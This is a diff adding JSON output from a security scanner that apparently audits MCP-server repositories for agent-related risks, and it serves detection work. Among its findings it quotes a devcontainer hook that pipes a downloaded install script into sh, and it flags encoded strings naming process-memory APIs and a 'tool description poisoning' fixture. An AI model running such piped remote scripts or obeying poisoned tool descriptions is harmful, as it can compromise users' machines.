@@ -1,0 +1,6246 @@
+{
+  "scanner": {
+    "cli": "0.1.0",
+    "exorcistCommit": "785aaf967c93dee937fa19bf1ebf94362668c38d",
+    "definitionsSha256": "0700e29416b5aeff805356c670374717da1ddae1a09fdad7528c923e38d50977",
+    "note": "CLI built once from the working tree (uncommitted precision round 2 changes on top of the commit named here: packages/core/src/scanner/signature-engine.ts, context.ts, normalizer.ts, definitions/schema.ts and definitions/) and copied out of the repo; the round-2 set, the round-1 dev re-run and the BENCHMARK.md re-run used this one build. Identify it by definitionsSha256. An earlier run of this set with an unbounded version of the EX-008/EX-015 pattern gave the same findings except one \"ran out of time\" medium finding on a 900 KB single-line JSON file; the bounded pattern removed it and changed nothing else."
+  },
+  "startedAt": "2026-11-23T07:45:06.319Z",
+  "repos": {
+    "gamosoft/NoteDiscovery": {
+      "repo": "gamosoft/NoteDiscovery",
+      "sha": "8ba8b9602dd8210a6b72e45006f3d977e37925eb",
+      "status": "ok",
+      "filesDownloaded": 105,
+      "filesScanned": 105,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 23,
+        "docs": 23,
+        "config": 24,
+        "unknown": 33,
+        "instruction": 2
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 289,
+      "ms": 1313,
+      "findings": []
+    },
+    "metatool-ai/metamcp": {
+      "repo": "metatool-ai/metamcp",
+      "sha": "05818ec2767b946f98d280ae9cefa401f0362d62",
+      "status": "ok",
+      "filesDownloaded": 490,
+      "filesScanned": 490,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 166,
+        "config": 120,
+        "instruction": 7,
+        "code": 187,
+        "manifest": 7,
+        "docs": 3
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 1103,
+      "ms": 2404,
+      "findings": []
+    },
+    "brightdata/brightdata-mcp": {
+      "repo": "brightdata/brightdata-mcp",
+      "sha": "e3e2054dde029de28988bbe8d5e18a913b41a950",
+      "status": "ok",
+      "filesDownloaded": 83,
+      "filesScanned": 82,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "code": 47,
+        "config": 24,
+        "docs": 2,
+        "instruction": 3,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 116,
+      "ms": 2842,
+      "findings": []
+    },
+    "CrossPaste/crosspaste-desktop": {
+      "repo": "CrossPaste/crosspaste-desktop",
+      "sha": "9498f76d23d85ba3c368bc97b3e10133038c4a88",
+      "status": "ok",
+      "filesDownloaded": 1655,
+      "filesScanned": 1655,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 109,
+        "unknown": 1501,
+        "config": 22,
+        "docs": 18,
+        "manifest": 1,
+        "instruction": 4
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 1683,
+      "ms": 3317,
+      "findings": []
+    },
+    "0xMassi/webclaw": {
+      "repo": "0xMassi/webclaw",
+      "sha": "50e1a36bf82b9e7a61a8ea466f7c22d5458c1575",
+      "status": "ok",
+      "filesDownloaded": 383,
+      "filesScanned": 383,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 48,
+        "code": 91,
+        "config": 34,
+        "unknown": 194,
+        "instruction": 13,
+        "mcp-config": 1,
+        "manifest": 2
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".mcp.json",
+        "CLAUDE.md"
+      ],
+      "scanMs": 581,
+      "ms": 4407,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": ".mcp.json",
+          "line": 5,
+          "span": "@webclaw/mcp"
+        }
+      ]
+    },
+    "moorcheh-ai/memanto": {
+      "repo": "moorcheh-ai/memanto",
+      "sha": "a118a1b1d396f79aac157179331c89f10bcabcfc",
+      "status": "ok",
+      "filesDownloaded": 1006,
+      "filesScanned": 1006,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 358,
+        "unknown": 81,
+        "instruction": 34,
+        "config": 87,
+        "code": 445,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "examples/claudecode-skills-memanto/lifecycle-hooks/skills/memanto-companion/SKILL.md"
+      ],
+      "scanMs": 1701,
+      "ms": 4910,
+      "findings": []
+    },
+    "LetsFG/LetsFG": {
+      "repo": "LetsFG/LetsFG",
+      "sha": "f8836c842c0560e1695a1467ec17250911c908a2",
+      "status": "ok",
+      "filesDownloaded": 204,
+      "filesScanned": 204,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 33,
+        "unknown": 40,
+        "code": 79,
+        "config": 34,
+        "instruction": 14,
+        "mcp-config": 1,
+        "manifest": 3
+      },
+      "agentFiles": 8,
+      "agentFileSample": [
+        "agent-skills-contribution/packages/skills-catalog/skills/(tooling)/letsfg/SKILL.md",
+        ".mcp.json",
+        "integrations/hermes/skills/letsfg/SKILL.md",
+        "SKILL.md",
+        "skills/flight-search/SKILL.md",
+        "skills/hotel-search/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 686,
+      "ms": 2042,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "mcp-config.json",
+          "line": 8,
+          "span": "letsfg-mcp"
+        }
+      ]
+    },
+    "devflowinc/trieve": {
+      "repo": "devflowinc/trieve",
+      "sha": "a99b21e23f21025757b44efb594676c4a7b7495f",
+      "status": "ok",
+      "filesDownloaded": 2837,
+      "filesScanned": 2837,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 374,
+        "unknown": 1268,
+        "code": 926,
+        "config": 219,
+        "instruction": 26,
+        "manifest": 24
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 3936,
+      "ms": 19688,
+      "findings": []
+    },
+    "can4hou6joeng4/boss-agent-cli": {
+      "repo": "can4hou6joeng4/boss-agent-cli",
+      "sha": "0757e564272a02f05f15e6f9649aad82106dd305",
+      "status": "ok",
+      "filesDownloaded": 858,
+      "filesScanned": 858,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 61,
+        "unknown": 24,
+        "instruction": 16,
+        "code": 728,
+        "config": 29
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 1352,
+      "ms": 3913,
+      "findings": [
+        {
+          "ruleId": "EX-008",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Remote code in hook",
+          "file": ".devcontainer/devcontainer.json",
+          "line": 10,
+          "span": "curl -LsSf https://astral.sh/uv/install.sh | sh"
+        }
+      ]
+    },
+    "beelzebub-labs/beelzebub": {
+      "repo": "beelzebub-labs/beelzebub",
+      "sha": "3f20be5355c7d6f144329e39c478cdd7ff98184c",
+      "status": "ok",
+      "filesDownloaded": 274,
+      "filesScanned": 274,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 73,
+        "docs": 18,
+        "unknown": 167,
+        "code": 14,
+        "manifest": 1,
+        "instruction": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 369,
+      "ms": 1137,
+      "findings": []
+    },
+    "joshuayoes/ios-simulator-mcp": {
+      "repo": "joshuayoes/ios-simulator-mcp",
+      "sha": "4c1d8db0f0c9caaf6523c5c6bfe31b02195f42cf",
+      "status": "ok",
+      "filesDownloaded": 19,
+      "filesScanned": 19,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 5,
+        "docs": 8,
+        "unknown": 2,
+        "instruction": 2,
+        "manifest": 1,
+        "code": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 78,
+      "ms": 373,
+      "findings": []
+    },
+    "nteract/semiotic": {
+      "repo": "nteract/semiotic",
+      "sha": "693ebba0f981346598b59f6d452fad7679d6f69d",
+      "status": "ok",
+      "filesDownloaded": 4883,
+      "filesScanned": 4879,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 1674,
+        "docs": 93,
+        "instruction": 45,
+        "code": 2746,
+        "config": 318,
+        "manifest": 2,
+        "mcp-config": 1
+      },
+      "agentFiles": 8,
+      "agentFileSample": [
+        "agent-skill/semiotic-charts/SKILL.md",
+        "chatgpt-app-submission/SKILL.md",
+        ".mcp.json",
+        ".agents/skills/blog-post/SKILL.md",
+        ".github/copilot-instructions.md",
+        ".github/skills/code-review/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 8956,
+      "ms": 20842,
+      "findings": []
+    },
+    "containers/kubernetes-mcp-server": {
+      "repo": "containers/kubernetes-mcp-server",
+      "sha": "5487d153843b1f4424d6ae3ce2452201d51331e7",
+      "status": "ok",
+      "filesDownloaded": 1095,
+      "filesScanned": 1095,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 573,
+        "code": 122,
+        "config": 349,
+        "instruction": 21,
+        "docs": 28,
+        "manifest": 2
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".agents/skills/toolset-design/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 1428,
+      "ms": 3379,
+      "findings": [
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "evals/results/builtin-openai-core-readonly-latest.json",
+          "line": 405,
+          "span": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwd..."
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "evals/results/builtin-openai-core-readonly-latest.json",
+          "line": 405,
+          "span": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lCQWpBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwd..."
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "evals/results/builtin-openai-core-readonly-latest.json",
+          "line": 405,
+          "span": "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBdUNIS2tGTEM2clMydU4xcXYrS3JnbTZkejdRQUxrUWo2Z2g0ekQ4N..."
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "evals/results/builtin-openai-core-readonly-latest.json",
+          "line": 519,
+          "span": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwd..."
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "evals/results/builtin-openai-core-readonly-latest.json",
+          "line": 519,
+          "span": "5 more encoded payload findings in this file (lines 519-531); only the first 4 are listed"
+        },
+        {
+          "ruleId": "EX-005",
+          "severity": "critical",
+          "source": "signature",
+          "title": "Tool description poisoning",
+          "file": "pkg/mcp/testdata/toolsets-observability-alert-management-tools.json",
+          "line": 18,
+          "span": "Before calling this"
+        }
+      ]
+    },
+    "cjo4m06/mcp-shrimp-task-manager": {
+      "repo": "cjo4m06/mcp-shrimp-task-manager",
+      "sha": "8a3be6bced310c7b660e5cfc3f42e4e5e45f2f61",
+      "status": "ok",
+      "filesDownloaded": 425,
+      "filesScanned": 425,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 23,
+        "unknown": 90,
+        "code": 104,
+        "docs": 180,
+        "instruction": 25,
+        "manifest": 2,
+        "mcp-config": 1
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "tools/task-viewer/CLAUDE.md",
+        ".claude/settings.local.json"
+      ],
+      "scanMs": 512,
+      "ms": 1328,
+      "findings": []
+    },
+    "benborla/mcp-server-mysql": {
+      "repo": "benborla/mcp-server-mysql",
+      "sha": "b9c714e182422b9f18437242b80cf003adf1c7ea",
+      "status": "ok",
+      "filesDownloaded": 72,
+      "filesScanned": 72,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 11,
+        "unknown": 13,
+        "docs": 11,
+        "instruction": 5,
+        "code": 30,
+        "mcp-config": 1,
+        "manifest": 1
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".mcp.json",
+        "skills/mcp-server-mysql/SKILL.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 398,
+      "ms": 8176,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": ".mcp.json",
+          "line": 7,
+          "span": "@benborla29/mcp-server-mysql"
+        }
+      ]
+    },
+    "zereight/gitlab-mcp": {
+      "repo": "zereight/gitlab-mcp",
+      "sha": "603a694d6fbbc3123584274ee1a617a59b3f22f0",
+      "status": "ok",
+      "filesDownloaded": 554,
+      "filesScanned": 554,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 108,
+        "code": 354,
+        "unknown": 20,
+        "config": 35,
+        "instruction": 35,
+        "manifest": 2
+      },
+      "agentFiles": 28,
+      "agentFileSample": [
+        ".github/copilot-instructions.md",
+        ".github/prompts/quick-plan.prompt.md",
+        ".github/prompts/quick-fix.prompt.md",
+        ".github/prompts/quick-review.prompt.md",
+        ".github/skills/cancel/SKILL.md",
+        ".github/skills/deep-dive/SKILL.md",
+        ".github/skills/trace/SKILL.md",
+        ".github/skills/coding-standards/SKILL.md",
+        ".github/skills/verify/SKILL.md",
+        ".github/skills/deep-interview/SKILL.md",
+        ".github/skills/self-improve/SKILL.md",
+        ".github/skills/plan/SKILL.md",
+        ".github/skills/ultraqa/SKILL.md",
+        ".github/skills/ultrawork/SKILL.md",
+        ".github/skills/ralph/SKILL.md",
+        ".github/skills/status/SKILL.md",
+        ".github/skills/omg-autopilot/SKILL.md",
+        ".github/skills/security-scan/SKILL.md",
+        ".github/skills/ai-slop-cleaner/SKILL.md",
+        ".github/skills/team/SKILL.md",
+        ".github/skills/review/SKILL.md",
+        ".github/skills/ralplan/SKILL.md",
+        ".github/skills/remember/SKILL.md",
+        ".github/skills/tdd/SKILL.md",
+        ".github/skills/skill-stocktake/SKILL.md"
+      ],
+      "scanMs": 1432,
+      "ms": 2404,
+      "findings": []
+    },
+    "doobidoo/mcp-memory-service": {
+      "repo": "doobidoo/mcp-memory-service",
+      "sha": "e4501cbfafd298d7e8428657975c4a37f6eef441",
+      "status": "ok",
+      "filesDownloaded": 1756,
+      "filesScanned": 1755,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 236,
+        "unknown": 114,
+        "instruction": 61,
+        "manifest": 4,
+        "code": 1241,
+        "config": 96,
+        "mcp-config": 3
+      },
+      "agentFiles": 17,
+      "agentFileSample": [
+        ".claude/settings.json",
+        ".claude/commands/triage.md",
+        ".claude/commands/refactor-function-prod",
+        ".claude/commands/merge-sweep.md",
+        ".claude/commands/refactor-function",
+        ".claude/commands/release.md",
+        ".claude/commands/refactor-function.md",
+        ".claude/skills/gitnexus-refactoring/SKILL.md",
+        ".claude/skills/gitnexus-debugging/SKILL.md",
+        ".claude/skills/gitnexus-exploring/SKILL.md",
+        ".claude/skills/gitnexus-impact-analysis/SKILL.md",
+        "docs/guides/AGENTS.md",
+        "examples/config/claude_desktop_config.json",
+        "scripts/.claude/settings.local.json",
+        "claude-hooks/skills/remember-session/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 4784,
+      "ms": 9240,
+      "findings": []
+    },
+    "chigwell/telegram-mcp": {
+      "repo": "chigwell/telegram-mcp",
+      "sha": "6045b24b844c9435f3d9c4f3948102a80e7ba5e6",
+      "status": "ok",
+      "filesDownloaded": 172,
+      "filesScanned": 172,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 9,
+        "mcp-config": 1,
+        "docs": 6,
+        "code": 144,
+        "config": 9,
+        "instruction": 3
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "claude_desktop_config.json"
+      ],
+      "scanMs": 341,
+      "ms": 1198,
+      "findings": []
+    },
+    "vmoranv/jshookmcp": {
+      "repo": "vmoranv/jshookmcp",
+      "sha": "15d260e0890d22c448ad25ff1bc4d47fb13e1c40",
+      "status": "ok",
+      "filesDownloaded": 3630,
+      "filesScanned": 3627,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 190,
+        "instruction": 12,
+        "docs": 127,
+        "config": 58,
+        "code": 3238,
+        "manifest": 2
+      },
+      "agentFiles": 6,
+      "agentFileSample": [
+        "skills/configuration/SKILL.md",
+        "skills/tool-selection/SKILL.md",
+        "skills/troubleshooting/SKILL.md",
+        "skills/getting-started/SKILL.md",
+        "skills/telemetry/SKILL.md",
+        "skills/best-practices/SKILL.md"
+      ],
+      "scanMs": 6149,
+      "ms": 9694,
+      "findings": [
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "src/utils/obfuscated-strings.ts",
+          "line": 66,
+          "span": "dm9pZCAqIE9wZW5Qcm9jZXNzKHVpbnQzMiwgaW50LCB1aW50MzIp"
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "src/utils/obfuscated-strings.ts",
+          "line": 69,
+          "span": "aW50IFJlYWRQcm9jZXNzTWVtb3J5KHZvaWQgKiwgdm9pZCAqLCBfT3V0XyB1aW50OF90ICosIHNpemVfdCwgX091dF8gc2l6ZV90ICop"
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "src/utils/obfuscated-strings.ts",
+          "line": 71,
+          "span": "aW50IFdyaXRlUHJvY2Vzc01lbW9yeSh2b2lkICosIHZvaWQgKiwgdWludDhfdCAqLCBzaXplX3QsIF9PdXRfIHNpemVfdCAqKQ=="
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "src/utils/obfuscated-strings.ts",
+          "line": 73,
+          "span": "c2l6ZV90IFZpcnR1YWxRdWVyeUV4KHZvaWQgKiwgdm9pZCAqLCBfT3V0XyB1aW50OF90ICosIHNpemVfdCk="
+        },
+        {
+          "ruleId": "EX-003",
+          "severity": "high",
+          "source": "signature",
+          "title": "Encoded payload",
+          "file": "src/utils/obfuscated-strings.ts",
+          "line": 75,
+          "span": "38 more encoded payload findings in this file (lines 75-187); only the first 4 are listed"
+        }
+      ]
+    },
+    "CoderGamester/mcp-unity": {
+      "repo": "CoderGamester/mcp-unity",
+      "sha": "d572dc88f1b982a0fdfc09cd14cfdfd760b658e8",
+      "status": "ok",
+      "filesDownloaded": 221,
+      "filesScanned": 221,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 2,
+        "instruction": 9,
+        "unknown": 147,
+        "config": 4,
+        "code": 57,
+        "manifest": 2
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".windsurfrules",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 418,
+      "ms": 1384,
+      "findings": []
+    },
+    "Aas-ee/open-webSearch": {
+      "repo": "Aas-ee/open-webSearch",
+      "sha": "2562c9233a945c18fa9d08b7e450ca218a8853b6",
+      "status": "ok",
+      "filesDownloaded": 127,
+      "filesScanned": 127,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 102,
+        "unknown": 5,
+        "docs": 10,
+        "instruction": 4,
+        "config": 5,
+        "manifest": 1
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        "skills/open-websearch/SKILL.md",
+        "skills/open-websearch-maintainer/SKILL.md"
+      ],
+      "scanMs": 249,
+      "ms": 1272,
+      "findings": []
+    },
+    "korotovsky/slack-mcp-server": {
+      "repo": "korotovsky/slack-mcp-server",
+      "sha": "b88c0de3f706f4f07337c9eda7133c736d1c9524",
+      "status": "ok",
+      "filesDownloaded": 77,
+      "filesScanned": 77,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 52,
+        "config": 11,
+        "docs": 4,
+        "instruction": 2,
+        "manifest": 7,
+        "code": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 140,
+      "ms": 1107,
+      "findings": []
+    },
+    "jau123/MeiGen-AI-Design-MCP": {
+      "repo": "jau123/MeiGen-AI-Design-MCP",
+      "sha": "95a983cf639fea264db4335491b697ee9c7e429f",
+      "status": "ok",
+      "filesDownloaded": 52,
+      "filesScanned": 52,
+      "filesSkipped": 0,
+      "roles": {
+        "config": 7,
+        "instruction": 5,
+        "manifest": 2,
+        "unknown": 4,
+        "docs": 10,
+        "code": 24
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "openclaw/SKILL.md"
+      ],
+      "scanMs": 105,
+      "ms": 824,
+      "findings": []
+    },
+    "bitbonsai/mcpvault": {
+      "repo": "bitbonsai/mcpvault",
+      "sha": "5d4e68550e9fe27fc24b9e16d96b8ff5b39355d7",
+      "status": "ok",
+      "filesDownloaded": 228,
+      "filesScanned": 189,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 64,
+        "config": 12,
+        "docs": 21,
+        "instruction": 7,
+        "mcp-config": 1,
+        "code": 82,
+        "manifest": 2
+      },
+      "agentFiles": 4,
+      "agentFileSample": [
+        ".claude/settings.json",
+        "skills/triage/SKILL.md",
+        "skills/obsidian/SKILL.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 338,
+      "ms": 875,
+      "findings": []
+    },
+    "mediar-ai/terminator": {
+      "repo": "mediar-ai/terminator",
+      "sha": "73a381c0c1c33eda55f2c0ecb1d918bf5ec7561a",
+      "status": "ok",
+      "filesDownloaded": 433,
+      "filesScanned": 433,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 8,
+        "instruction": 24,
+        "config": 42,
+        "unknown": 236,
+        "code": 105,
+        "manifest": 18
+      },
+      "agentFiles": 5,
+      "agentFileSample": [
+        ".cursor/rules/rule.mdc",
+        ".claude/commands/release.md",
+        ".claude/skills/remote-mcp/skill.md",
+        ".claude/skills/terminator-issue-reporter/skill.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 943,
+      "ms": 1665,
+      "findings": []
+    },
+    "julien040/anyquery": {
+      "repo": "julien040/anyquery",
+      "sha": "b85153e638ad34ffde003db6e7c154db88d730f9",
+      "status": "ok",
+      "filesDownloaded": 1230,
+      "filesScanned": 1229,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 173,
+        "unknown": 820,
+        "config": 139,
+        "instruction": 52,
+        "code": 42,
+        "manifest": 3
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 857,
+      "ms": 4823,
+      "findings": []
+    },
+    "vshulcz/deja-vu": {
+      "repo": "vshulcz/deja-vu",
+      "sha": "585deef823b6214dd03c6bf45d8878f61b914a6e",
+      "status": "ok",
+      "filesDownloaded": 1984,
+      "filesScanned": 1979,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 264,
+        "config": 102,
+        "instruction": 59,
+        "unknown": 1454,
+        "code": 87,
+        "manifest": 12,
+        "mcp-config": 1
+      },
+      "agentFiles": 18,
+      "agentFileSample": [
+        "codex-plugin/skills/deja-history/SKILL.md",
+        "claude-plugin/skills/deja-history/SKILL.md",
+        "claude-plugin/skills/deja-reflect/SKILL.md",
+        "claude-plugin/skills/deja-handoff/SKILL.md",
+        "codebuddy-plugin/skills/deja-history/SKILL.md",
+        "antigravity-plugin/rules/AGENTS.md",
+        "antigravity-plugin/skills/deja-history/SKILL.md",
+        "extensions/grok/skills/deja-history/SKILL.md",
+        "extensions/codewhale/skills/deja-history/SKILL.md",
+        "extensions/kimi/skills/deja-history/SKILL.md",
+        "devin-plugin/skills/deja-history/SKILL.md",
+        "SKILL.md",
+        "GEMINI.md",
+        "skills/deja-reflect/SKILL.md",
+        "skills/deja-handoff/SKILL.md",
+        "skills/deja-search/SKILL.md",
+        "cursor-plugin/skills/deja-history/SKILL.md",
+        "mcp.json"
+      ],
+      "scanMs": 2326,
+      "ms": 4606,
+      "findings": []
+    },
+    "mcpjungle/MCPJungle": {
+      "repo": "mcpjungle/MCPJungle",
+      "sha": "5676b76a7ea206b7fe2d7a74ec2c6eb12cc3d5c8",
+      "status": "ok",
+      "filesDownloaded": 249,
+      "filesScanned": 249,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 229,
+        "config": 8,
+        "manifest": 1,
+        "instruction": 4,
+        "code": 6,
+        "docs": 1
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        "web/dashboard/AGENTS.md",
+        "docs/AGENTS.md",
+        "AGENTS.md"
+      ],
+      "scanMs": 244,
+      "ms": 3139,
+      "findings": []
+    },
+    "isaacphi/mcp-language-server": {
+      "repo": "isaacphi/mcp-language-server",
+      "sha": "e4395849a52e18555361abab60a060802c06bf50",
+      "status": "ok",
+      "filesDownloaded": 279,
+      "filesScanned": 279,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 256,
+        "instruction": 5,
+        "code": 12,
+        "config": 5,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 346,
+      "ms": 1208,
+      "findings": []
+    },
+    "Flux159/mcp-server-kubernetes": {
+      "repo": "Flux159/mcp-server-kubernetes",
+      "sha": "f93604a20e388a08caac548c380cde8a5c532d5c",
+      "status": "ok",
+      "filesDownloaded": 155,
+      "filesScanned": 154,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 6,
+        "config": 35,
+        "code": 100,
+        "docs": 9,
+        "instruction": 3,
+        "manifest": 1
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 154,
+      "ms": 973,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "gemini-extension.json",
+          "line": 2,
+          "span": "mcp-server-kubernetes"
+        }
+      ]
+    },
+    "ezyang/codemcp": {
+      "repo": "ezyang/codemcp",
+      "sha": "1ebdb61755c33a420332e6ff73f9fd1c1254d721",
+      "status": "ok",
+      "filesDownloaded": 113,
+      "filesScanned": 113,
+      "filesSkipped": 0,
+      "roles": {
+        "code": 80,
+        "config": 7,
+        "unknown": 15,
+        "instruction": 5,
+        "docs": 6
+      },
+      "agentFiles": 2,
+      "agentFileSample": [
+        ".cursor/rules/expecttest.mdc",
+        "CLAUDE.md"
+      ],
+      "scanMs": 148,
+      "ms": 629,
+      "findings": []
+    },
+    "brave/brave-search-mcp-server": {
+      "repo": "brave/brave-search-mcp-server",
+      "sha": "78f32e1d552231638d3f1afd9bc1572db635a651",
+      "status": "ok",
+      "filesDownloaded": 98,
+      "filesScanned": 98,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 12,
+        "config": 12,
+        "instruction": 1,
+        "manifest": 1,
+        "code": 72
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 118,
+      "ms": 473,
+      "findings": []
+    },
+    "nickclyde/duckduckgo-mcp-server": {
+      "repo": "nickclyde/duckduckgo-mcp-server",
+      "sha": "8182af3f2295017ca90527a924f48147fbf18d5b",
+      "status": "ok",
+      "filesDownloaded": 16,
+      "filesScanned": 16,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "config": 4,
+        "instruction": 2,
+        "docs": 1,
+        "code": 4
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "CLAUDE.md"
+      ],
+      "scanMs": 61,
+      "ms": 339,
+      "findings": []
+    },
+    "qdrant/mcp-server-qdrant": {
+      "repo": "qdrant/mcp-server-qdrant",
+      "sha": "ff5ddd6f4bddd937331695a8873582c6cdf01775",
+      "status": "ok",
+      "filesDownloaded": 38,
+      "filesScanned": 38,
+      "filesSkipped": 0,
+      "roles": {
+        "unknown": 5,
+        "config": 8,
+        "instruction": 2,
+        "code": 23
+      },
+      "agentFiles": 1,
+      "agentFileSample": [
+        "kiro-power/skills/setup/SKILL.md"
+      ],
+      "scanMs": 103,
+      "ms": 453,
+      "findings": [
+        {
+          "ruleId": "EX-010",
+          "severity": "medium",
+          "source": "signature",
+          "title": "Unpinned MCP server",
+          "file": "kiro-power/mcp.json",
+          "line": 7,
+          "span": "mcp-server-qdrant"
+        }
+      ]
+    },
+    "heymrun/heym": {
+      "repo": "heymrun/heym",
+      "sha": "0f5316a171254bbc59d8c5b584246dde06c57b34",
+      "status": "ok",
+      "filesDownloaded": 2764,
+      "filesScanned": 2764,
+      "filesSkipped": 0,
+      "roles": {
+        "instruction": 5,
+        "unknown": 447,
+        "code": 1979,
+        "docs": 304,
+        "config": 28,
+        "manifest": 1
+      },
+      "agentFiles": 3,
+      "agentFileSample": [
+        ".cursor/skills/heym-documentation/SKILL.md",
+        "AGENTS.md",
+        "CLAUDE.md"
+      ],
+      "scanMs": 2980,
+      "ms": 11311,
+      "findings": []
+    },
+    "anaisbetts/mcp-installer": {
+      "repo": "anaisbetts/mcp-installer",
+      "sha": "747fbd88aa2e54368f98252fc9e8d228748dc594",
+      "status": "ok",
+      "filesDownloaded": 10,
+      "filesScanned": 10,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 1,
+        "instruction": 1,
+        "unknown": 4,
+        "config": 2,
+        "manifest": 1,
+        "code": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 26,
+      "ms": 533,
+      "findings": []
+    },
